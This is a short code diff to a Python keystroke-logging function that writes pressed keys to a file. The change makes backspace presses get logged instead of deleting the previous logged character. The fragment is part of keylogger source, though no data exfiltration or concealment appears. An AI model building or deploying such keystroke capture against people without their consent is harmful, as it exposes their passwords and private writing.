@@ -14,10 +14,11 @@ def keyPress(key):
 	        if key == keyboard.Key.space:
 	            f.write(' ')
 	        elif key == keyboard.Key.backspace:
-	            f.seek(0, 2)
-	            size = f.tell()
-	            if(size > 0):
-	            	f.truncate(size-1)
+	        	f.write(str(key) + '\n')
+	            # f.seek(0, 2)
+	            # size = f.tell()
+	            # if(size > 0):
+	            # 	f.truncate(size-1)
 	        elif key == keyboard.Key.enter:
 	        	f.write('\n')
 	       	else:
